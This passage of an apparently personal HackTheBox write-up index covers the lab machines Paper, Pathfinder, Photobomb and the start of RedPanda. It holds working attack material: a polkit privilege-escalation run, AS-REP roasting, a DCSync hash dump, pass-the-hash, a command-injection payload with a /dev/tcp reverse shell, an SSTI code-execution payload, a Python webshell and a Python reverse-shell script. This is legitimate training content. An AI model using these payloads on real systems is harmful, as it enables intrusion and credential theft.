}\n</code></pre>"},{"location":"HackTheBox/Paper/","title":"Paper","text":""},{"location":"HackTheBox/Paper/#nmap-scan","title":"Nmap scan","text":"<p>Time for the typical full ports basic Nmap scan and a more detailed one once we know what is open:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p- --min-rate 1000 10.10.11.143    \nStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 06:12 EDT\nNmap scan report for 10.10.11.143\nHost is up (0.055s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n443/tcp open  https\n\nNmap done: 1 IP address (1 host up) scanned in 30.77 seconds\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p22,80,443 -sC -sV 10.10.11.143\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 06:13 EDT\nNmap scan report for 10.10.11.143\nHost is up (0.051s latency).\n\nPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)\n| ssh-hostkey: \n|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)\n|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)\n|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)\n80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)\n|_http-title: HTTP Server Test Page powered by CentOS\n|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9\n443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)\n|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28\n|_http-title: HTTP Server Test Page powered by CentOS\n| http-methods: \n|_  Potentially risky methods: TRACE\n| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US\n| Subject Alternative Name: DNS:localhost.localdomain\n| Not valid before: 2021-07-03T08:52:34\n|_Not valid after:  2022-07-08T10:32:34\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn: \n|_  http/1.1\n|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 16.77 seconds\n</code></pre> <p>Looking at the open ports I think we can go for the webpage first.</p>"},{"location":"HackTheBox/Paper/#http-server","title":"HTTP server","text":"<p>We are welcomed by an Apache test webpage, the thing is that Gobuster did not find anything. I tried Nikto to see if it finds something:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Paper]\n\u2514\u2500$ nikto -host http://10.10.11.143/\n- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ Target IP:          10.10.11.143\n+ Target Hostname:    10.10.11.143\n+ Target Port:        80\n+ Start Time:         2022-05-31 06:55:29 (GMT-4)\n---------------------------------------------------------------------------\n+ Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS\n+ Uncommon header 'x-backend-server' found, with contents: office.paper\n...\n</code></pre> <p>That uncommon header <code>office.paper</code> is interesting, I tried that as domain to see if there are virtual hosts in place and I was able to access a Wordpress application.</p>"},{"location":"HackTheBox/Paper/#wordpress","title":"Wordpress","text":"<p>The Wordpress version is 5.2.3 and I found this comment in one of the posts:</p> <pre><code>Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think!\n</code></pre> <p>Researching a bit I stumbled with this: https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/ which talk about a vulnerability in this Wordpress version that allows an attacker to get secret contents just by adding <code>?static=1</code> to the URL. This is the result:</p> <pre><code>...\n# Secret Registration URL of new Employee chat system\n\nhttp://chat.office.paper/register/8qozr226AhkCHZdyY\n\n# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.\n...\n</code></pre> <p>Cool, we got another virtual host and also a way of registering to the chat application hosted there, let's add the domain to our <code>hosts</code> file and let's see how it goes.</p>"},{"location":"HackTheBox/Paper/#rocket-chat","title":"Rocket Chat","text":"<p>After registering a user we can explore this chat service a bit. Looks like there is a bot that let us get files from the system, in theory it only allow us to get file from inside a certain folder but is pretty easy to bypass using relative paths: <code>../something</code>. We can't inject command though.</p> <p>Exploring the folder a bit I was able to leak the bot environment variables the with <code>../hubot/.env</code>. Inside that file we have credentials for the bot account: <code>recyclops:Queenofblad3s!23</code>, the problem is that the bot can't access the web interface and the API looks like is only reachable from localhost. The thing is... looking at the directory listing we see the user in the machine: <code>dwight</code> so maybe it likes to reuse passwords.</p> <p>I tried <code>dwight:Queenofblad3s!23</code> as credentials for the SSH service and I got access!</p>"},{"location":"HackTheBox/Paper/#in-the-machine-as-dwight","title":"In the machine as dwight","text":"<p>To be honest this part was pretty fast. After some basic enumeration I launched Linpeas and immediately CVE-2021-3560 appeared as vector, I used this PoC: https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation:</p> <pre><code>[dwight@paper meh]$ ./CVE-2021-3560.sh -p=123\n\n[!] Username set as : secnigma\n[!] No Custom Timing specified.\n[!] Timing will be detected Automatically\n[!] Force flag not set.\n[!] Vulnerability checking is ENABLED!\n[!] Starting Vulnerability Checks...\n[!] Checking distribution...\n[!] Detected Linux distribution as \"centos\"\n[!] Checking if Accountsservice and Gnome-Control-Center is installed\n[+] Accounts service and Gnome-Control-Center Installation Found!!\n[!] Checking if polkit version is vulnerable\n[+] Polkit version appears to be vulnerable!!\n[!] Starting exploit...\n[!] Inserting Username secnigma...\nError org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required\n[+] Inserted Username secnigma  with UID 1005!\n[!] Inserting password hash...\n[!] It looks like the password insertion was succesful!\n[!] Try to login as the injected user using su - secnigma\n[!] When prompted for password, enter your password \n[!] If the username is inserted, but the login fails; try running the exploit again.\n[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!\n[dwight@paper meh]$ su - secnigma\nPassword: \n[secnigma@paper ~]$ sudo bash\n[sudo] password for secnigma: \n[root@paper secnigma]#\n</code></pre> <p>The <code>root</code> flag is under <code>/root/root.txt</code>.</p>"},{"location":"HackTheBox/Pathfinder/","title":"Pathfinder","text":""},{"location":"HackTheBox/Pathfinder/#nmap-scan","title":"nmap scan","text":"<p>As usual, let's start with a <code>nmap</code> scan:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap &lt;MACHINE_IP&gt; -p- --min-rate 1000\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-04 07:42 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.050s latency).\nNot shown: 65511 closed ports\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49671/tcp open  unknown\n49676/tcp open  unknown\n49677/tcp open  unknown\n49683/tcp open  unknown\n49698/tcp open  unknown\n49717/tcp open  unknown\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 103.38 seconds\n           Raw packets sent: 102973 (4.531MB) | Rcvd: 84680 (3.387MB)\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap &lt;MACHINE_IP&gt; -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49683,49698,49717 -sC -sV\n[sudo] password for kali: \nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-04 10:41 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.057s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-09-04 21:50:03Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49671/tcp open  msrpc         Microsoft Windows RPC\n49676/tcp open  msrpc         Microsoft Windows RPC\n49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49683/tcp open  msrpc         Microsoft Windows RPC\n49698/tcp open  msrpc         Microsoft Windows RPC\n49717/tcp open  msrpc         Microsoft Windows RPC\nService Info: Host: PATHFINDER; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: 7h08m04s\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2021-09-04T21:50:57\n|_  start_date: N/A\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 66.73 seconds\n</code></pre> <p>So this machine looks like a Domain Controller. I think is the first time ever i have to work with Active Directory... let's see how this goes. Also we can see that WinRM is open, can be handy in the future.</p>"},{"location":"HackTheBox/Pathfinder/#domain-enumeration","title":"Domain enumeration","text":"<p>Using the credentials we found in the Shield box: <code>sandra:Password1234!</code> we can authenticate in the domain so we can try to check the users:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -dc-ip &lt;MACHINE_IP&gt; MEGACORP.LOCAL/sandra\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\nPassword:\n[*] Querying &lt;MACHINE_IP&gt; for information about domain.\nName                  Email                           PasswordLastSet      LastLogon           \n--------------------  ------------------------------  -------------------  -------------------\nAdministrator                                         2020-03-17 14:52:07.517633  2020-03-20 21:09:30.654209 \nGuest                                                 &lt;never&gt;              &lt;never&gt;             \nkrbtgt                                                2020-01-25 16:53:34.376107  &lt;never&gt;             \nsvc_bes                                               2020-03-20 20:16:54.721477  2021-09-04 18:43:16.045548 \nsandra                                                2020-03-20 20:17:40.846466  2021-09-04 18:29:37.061223\n</code></pre> <p>Also, with BloodHound (Remember to open <code>neo4j</code> database first!) we can check a lot of information about the domain, we can use the <code>bloodhound-python</code> as ingestor:</p> <pre><code>bloodhound-python -u sandra -p Password1234! -ns &lt;MACHINE_IP&gt; -d megacorp.local -c all\n</code></pre> <p>Once we upload the information to BloodHound we can check for attack vectors. The <code>Find Principals with DCSync Rights</code> query returned something insteresting:</p> <p></p> <p><code>SVC_BES</code> user has <code>GetChanges</code> and <code>GetChangesAll</code> privileges so we can perform a <code>dsync</code> attack from that user to get a list of the domain users secrets. Let's check if that user has Kerberos pre-authentication enabled:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip &lt;MACHINE_IP&gt; -no-pass  megacorp.local/svc_bes\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] Getting TGT for svc_bes\n$krb5asrep$23$svc_bes@MEGACORP.LOCAL:e38bdf345d80e70f11bc176b32d549a2$e710e585dabe65b552cc143b9426423877ec00c38b1531d904591c9905dbba0ed28d516cb5aca86864769a9e47d0af41a7b4557949b235dccadbc2ca18346010a08fed48fa67bf0582a74592c415d29b3f2066919206c3cd4e329629883c82f428e5ce37f5408f6708b943eeca1d95dd7b469e2ca09ba874639d226d51a4581ef396e41fd15e6ca6f33420cfbcb53457a8ec4a8c5f96e70d6f38f7b66347380c834f9ce3a05ea8c8d36c708a4ffe3908f9af5d5b9734854a15c704c4a13313584ab009d6c5a036f4858c960ee34952b9281787147b4a53ea14b3c06a0a455c9ad7fada2c9f06aa7b7e114132b8313f4c\n</code></pre>"},{"location":"HackTheBox/Pathfinder/#asreproasting","title":"ASREPRoasting","text":"<p>We got a TGT so we can go for a ASREPRoasting using <code>hashcat</code> (I tried <code>john</code> but looks like it is broken in my system or whatever):</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/HTB/Pathfinder]\n\u2514\u2500$ hashcat -m 18200 -a 0 hash.txt ~/Tools/Wordlists/rockyou.txt \nhashcat (v6.1.1) starting...\n[...]\n$krb5asrep$23$svc_bes@MEGACORP.LOCAL:e38bdf345d80e70f11bc176b32d549a2$e710e585dabe65b552cc143b9426423877ec00c38b1531d904591c9905dbba0ed28d516cb5aca86864769a9e47d0af41a7b4557949b235dccadbc2ca18346010a08fed48fa67bf0582a74592c415d29b3f2066919206c3cd4e329629883c82f428e5ce37f5408f6708b943eeca1d95dd7b469e2ca09ba874639d226d51a4581ef396e41fd15e6ca6f33420cfbcb53457a8ec4a8c5f96e70d6f38f7b66347380c834f9ce3a05ea8c8d36c708a4ffe3908f9af5d5b9734854a15c704c4a13313584ab009d6c5a036f4858c960ee34952b9281787147b4a53ea14b3c06a0a455c9ad7fada2c9f06aa7b7e114132b8313f4c:Sheffield19\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Name........: Kerberos 5, etype 23, AS-REP\nHash.Target......: $krb5asrep$23$svc_bes@MEGACORP.LOCAL:e38bdf345d80e7...313f4c\nTime.Started.....: Sat Sep  4 13:43:33 2021 (18 secs)\nTime.Estimated...: Sat Sep  4 13:43:51 2021 (0 secs)\nGuess.Base.......: File (/home/kali/Tools/Wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:   599.9 kH/s (11.13ms) @ Accel:64 Loops:1 Thr:64 Vec:8\nRecovered........: 1/1 (100.00%) Digests\nProgress.........: 10616832/14344359 (74.01%)\nRejected.........: 0/10616832 (0.00%)\nRestore.Point....: 10600448/14344359 (73.90%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidates.#1....: Sidney07 -&gt; Sabine13\n\nStarted: Sat Sep  4 13:42:18 2021\nStopped: Sat Sep  4 13:43:51 2021\n</code></pre> <p>So we got new credentials! <code>svc_bes:Sheffield19</code>.</p>"},{"location":"HackTheBox/Pathfinder/#using-winrm-as-svc_bes","title":"Using WinRM as svc_bes","text":"<p>Remember the <code>winrm</code> service? We can use it to get the user flag!</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ evil-winrm -i &lt;MACHINE_IP&gt; -u svc_bes -p Sheffield19\n\nEvil-WinRM shell v3.2\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\svc_bes\\Documents&gt;\n</code></pre> <p>The user flag is under <code>C:\\Users\\svc_bes\\Desktop\\user.txt</code>.</p>"},{"location":"HackTheBox/Pathfinder/#dcsync-attack","title":"DCSync attack","text":"<p>Now we have access to the user <code>svc_bes</code> and we can go for the DCSync attack. We can use <code>secretsdump.py</code>from <code>impacket</code>:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -dc-ip &lt;MACHINE_IP&gt; megacorp.local/svc_bes:Sheffield19@&lt;MACHINE_IP&gt;\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied \n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:f9f700dbf7b492969aac5943dab22ff3:::\nsvc_bes:1104:aad3b435b51404eeaad3b435b51404ee:0d1ce37b8c9e5cf4dbd20f5b88d5baca:::\nsandra:1105:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::\nPATHFINDER$:1000:aad3b435b51404eeaad3b435b51404ee:72d67f7817427a6c2fe2877249511a6c:::\n[*] Kerberos keys grabbed\nAdministrator:aes256-cts-hmac-sha1-96:056bbaf3be0f9a291fe9d18d1e3fa9e6e4aff65ef2785c3fdc4f6472534d614f\nAdministrator:aes128-cts-hmac-sha1-96:5235da455da08703cc108293d2b3fa1b\nAdministrator:des-cbc-md5:f1c89e75a42cd0fb\nkrbtgt:aes256-cts-hmac-sha1-96:d6560366b08e11fa4a342ccd3fea07e69d852f927537430945d9a0ef78f7dd5d\nkrbtgt:aes128-cts-hmac-sha1-96:02abd84373491e3d4655e7210beb65ce\nkrbtgt:des-cbc-md5:d0f8d0c86ee9d997\nsvc_bes:aes256-cts-hmac-sha1-96:2712a119403ab640d89f5d0ee6ecafb449c21bc290ad7d46a0756d1009849238\nsvc_bes:aes128-cts-hmac-sha1-96:7d671ab13aa8f3dbd9f4d8e652928ca0\nsvc_bes:des-cbc-md5:1cc16e37ef8940b5\nsandra:aes256-cts-hmac-sha1-96:2ddacc98eedadf24c2839fa3bac97432072cfac0fc432cfba9980408c929d810\nsandra:aes128-cts-hmac-sha1-96:c399018a1369958d0f5b242e5eb72e44\nsandra:des-cbc-md5:23988f7a9d679d37\nPATHFINDER$:aes256-cts-hmac-sha1-96:b918cf6ef0d04dc72cdfb040d9ffac663c28d2c358cbf35ab3466aa454cadfdc\nPATHFINDER$:aes128-cts-hmac-sha1-96:44f15fe35fb206e80d660933a7c31af9\nPATHFINDER$:des-cbc-md5:9b9e1089195273e0\n[*] Cleaning up...\n</code></pre> <p>With that we have the domain administrator secret so we can impersonate him! Let's try to get a shell into the system now.</p>"},{"location":"HackTheBox/Pathfinder/#accessing-the-system-as-root","title":"Accessing the system as root","text":"<p>Now we can go for a Pass-the-Hash attack using <code>psexec.py</code> (Again from <code>impacket</code>):</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ python3 /usr/share/doc/python3-impacket/examples/psexec.py -dc-ip &lt;MACHINE_IP&gt; megacorp.local/Administrator@&lt;MACHINE_IP&gt; -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] Requesting shares on &lt;MACHINE_IP&gt;.....\n[*] Found writable share ADMIN$\n[*] Uploading file DVmUjbDh.exe\n[*] Opening SVCManager on &lt;MACHINE_IP&gt;.....\n[*] Creating service LUsD on &lt;MACHINE_IP&gt;.....\n[*] Starting service LUsD.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.17763.107]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;\n</code></pre> <p>The root flag is under <code>C:\\Users\\Administrator\\Desktop\\root.txt</code>.</p>"},{"location":"HackTheBox/Photobomb/","title":"Photobomb","text":""},{"location":"HackTheBox/Photobomb/#nmap","title":"Nmap","text":"<p>As usual a Nmap scan to know what we can do here:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap --min-rate 1000 -p- 10.10.11.182\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-11-29 10:54 CET\nNmap scan report for 10.10.11.182\nHost is up (0.063s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 42.14 seconds\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -sC -sV -p 22,80 10.10.11.182   \nStarting Nmap 7.93 ( https://nmap.org ) at 2022-11-29 10:57 CET\nNmap scan report for 10.10.11.182\nHost is up (0.055s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://photobomb.htb/\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.78 seconds\n</code></pre> <p>Only two ports, let's check that website. I can see that it is redirecting to <code>photobomb.htb</code> so I added it to my <code>hosts</code> file.</p>"},{"location":"HackTheBox/Photobomb/#port-80","title":"Port 80","text":""},{"location":"HackTheBox/Photobomb/#initial-access","title":"Initial access","text":"<p>The site shows a really simple landing page and looks like there is another directory <code>/printer</code> that it is protected with a user and a password. Looking around I found this Javascript file:</p> <pre><code>// http://photobomb.htb/photobomb.js\nfunction init() {\n  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me\n  if (document.cookie.match(/^(.*;)?\\s*isPhotoBombTechSupport\\s*=\\s*[^;]+(.*)?$/)) {\n    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');\n  }\n}\nwindow.onload = init;\n</code></pre> <p>We have credentials now! <code>pH0t0:b0Mb!</code>.</p>"},{"location":"HackTheBox/Photobomb/#rce-and-reverse-shell","title":"RCE and reverse shell","text":"<p>The <code>/printer</code> directory allows the user to download different pictures with the quality and format that it selected. Playing a bit with the parameters I noticed that I was able to get code execution introducing the characters <code>&amp;&amp;</code> at the end of the parameter used for the image format:</p> <p></p> <p>Using the next payload I was able to get a reverse shell as the user <code>wizard</code>:</p> <pre><code>photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&amp;filetype=jpg%26%26%2Fbin%2Fbash%20-c%20\"%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.24%2F8000%200%3E%261\"&amp;dimensions=300x200\n</code></pre>"},{"location":"HackTheBox/Photobomb/#privesc","title":"Privesc","text":"<p>To be honest this part was pretty easy, I found that our user is able to execute <code>/opt/cleanup.sh</code> as the <code>root</code> user and it can also specify environment variables:</p> <pre><code>wizard@photobomb:~$ sudo -l\nMatching Defaults entries for wizard on photobomb:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser wizard may run the following commands on photobomb:\n    (root) SETENV: NOPASSWD: /opt/cleanup.sh\n</code></pre> <p>Checking the script I quickly found that in the last line the <code>find</code> command is not using an absolute path:</p> <pre><code>#!/bin/bash\n. /opt/.bashrc\ncd /home/wizard/photobomb\n\n# clean up log files\nif [ -s log/photobomb.log ] &amp;&amp; ! [ -L log/photobomb.log ]\nthen\n  /bin/cat log/photobomb.log &gt; log/photobomb.log.old\n  /usr/bin/truncate -s0 log/photobomb.log\nfi\n\n# protect the priceless originals\nfind source_images -type f -name '*.jpg' -exec chown root:root {} \\;\n</code></pre> <p>Since we are capable of injecting environment variables while executing the script with <code>sudo</code>, we can just create a script to execute a shell in our home directory called <code>find</code> and add our home directory to the <code>PATH</code> environment variable. This way, when we run the script with <code>sudo</code>, we will get a new shell as <code>root</code> once the script reaches the <code>find</code> command:</p> <pre><code>wizard@photobomb:~$ cat find \n#! /bin/bash\n\nbash\nwizard@photobomb:~$ sudo PATH=\"/home/wizard:$PATH\" /opt/cleanup.sh\nroot@photobomb:/home/wizard/photobomb# id\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre>"},{"location":"HackTheBox/RedPanda/","title":"RedPanda","text":""},{"location":"HackTheBox/RedPanda/#nmap","title":"Nmap","text":"<p>Here it comes the Nmap scan!</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap --min-rate 1500 -p- -Pn 10.10.11.170\n[sudo] password for kali: \nStarting Nmap 7.93 ( https://nmap.org ) at 2022-11-25 04:29 EST\nNmap scan report for 10.10.11.170\nHost is up (0.063s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n8080/tcp open  http-proxy\n\nNmap done: 1 IP address (1 host up) scanned in 19.96 seconds\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -sC -sV -p 22,8080 10.10.11.170\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-11-25 04:30 EST\nNmap scan report for 10.10.11.170\nHost is up (0.046s latency).\n\nPORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)\n|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)\n|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)\n8080/tcp open  http-proxy\n|_http-open-proxy: Proxy might be redirecting requests\n|_http-title: Red Panda Search | Made with Spring Boot\n\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 19.56 seconds\n</code></pre> <p>Only 2 ports open, since one of them is SSH I will start with the 8080 that looks like a web service.</p>"},{"location":"HackTheBox/RedPanda/#red-panda-search","title":"Red Panda Search","text":""},{"location":"HackTheBox/RedPanda/#the-user-flag","title":"The user flag","text":"<p>The application looks like a search engine for panda photos. It basically counts the visits to the photos of a certain artist when they appear in your search (The browser cache looks like mess with this a bit).</p> <p>After looking around I was able to find what looks like a SSTI vulnerability in the search bar. Introducing something like: <code>*{T(java.lang.System).getenv()}</code> prints the environment variables of the system:</p> <pre><code>{PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, SHELL=/bin/bash, JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64, TERM=unknown, USER=woodenk, LANG=en_US.UTF-8, SUDO_USER=root, SUDO_COMMAND=/usr/bin/java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar, SUDO_GID=0, MAIL=/var/mail/woodenk, LOGNAME=woodenk, SUDO_UID=0, HOME=/home/woodenk}\n</code></pre> <p>After some trial and error I got RCE using this query <code>*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}</code>:</p> <pre><code>uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)\n</code></pre> <p>I created a little Python script to allow me to use this RCE like a really simple prompt, not perfect but effective to get the user flag!</p> <pre><code>import requests\nfrom bs4 import BeautifulSoup\n\n\nurl = 'http://10.10.11.170:8080/search'\n\nwhile True:\n    command = input('&gt; ')\n    data = {'name': \"*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('\" + command + \"').getInputStream())}\"}\n\n    response = requests.post(url, data = data)\n    if response.ok:\n        soup = BeautifulSoup(response.content, \"html.parser\")\n        command_out = soup.find_all(\"h2\", class_=\"searched\")\n        print(command_out[0].get_text().replace('You searched for: ', ''))\n</code></pre>"},{"location":"HackTheBox/RedPanda/#reverse-shell","title":"Reverse shell","text":"<p>The webshell was ok for simple enumeration but I needed something better. I tried my best trying to get a reverse shell but something was not working properly. I decided to upload this simple Python reverse shell script to the target and execute it through the webshell:</p> <pre><code>import sys,socket,os,pty\n\n\ns=socket.socket()\ns.connect((\"10.10.14.26\", 8000))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/bash\")\n</code></pre> <p>It worked like a charm so we have a proper shell now.</p>"},{"location":"HackTheBox/RedPanda/#privesc","title":"Privesc","text":""},{"location":"HackTheBox/RedPanda/#enumerating-the-system","title":"Enumerating the system","text":"<p>I noticed that I got access as the <code>woodenk</code> user through my reverse shell:</p> 